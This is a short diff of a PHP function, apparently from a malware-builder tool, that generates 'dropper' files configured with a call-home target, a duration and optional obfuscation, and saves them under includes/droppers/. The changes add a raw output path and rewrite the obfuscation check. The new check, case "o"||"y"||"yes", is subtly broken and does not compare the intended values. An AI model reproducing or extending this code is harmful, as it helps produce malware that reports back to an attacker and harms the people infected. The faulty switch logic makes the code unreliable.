@@ -150,11 +150,12 @@ function clo($host, $repo, $uri)
 
 function createDropper($callHome, $duration, $extras, $obfsucate){
     $ob = 'includes/droppers/obfuscated/'.bin2hex(random_bytes(rand(5,25))).'.php';
+    $n = 'includes/droppers/raw/'.bin2hex(random_bytes(rand(5,25))).'.php';
     if (!empty($callHome) && !empty($duration) && !empty($extras)){
         try{
             switch(is_file("includes/droppers/dropper.php")){
                 case true:
-                    shell_exec("cp includes/droppers/dropper.php includes/droppers/raw/dropper.php");
+                    echo "We have the dropper downloaded :)\n";
                     break;
                 case false:
                     echo "Downloading dropper from github....\n";
@@ -164,12 +165,12 @@ function createDropper($callHome, $duration, $extras, $obfsucate){
                     echo "Something went wrong..\n";
                     break;
             }
-            switch ($obfsucate){
-                case "o":
+            switch (strtolower($obfsucate)){
+                case "o"||"y"||"yes":
                     print("Generated dropper will be: {$ob}\n");
                     break;
                 default:
-                    print("Generated Dropper will be: {$ob}\n");
+                    print("Generated Dropper will be: {$n}\n");
             }
 
         }catch (Exception $exception){
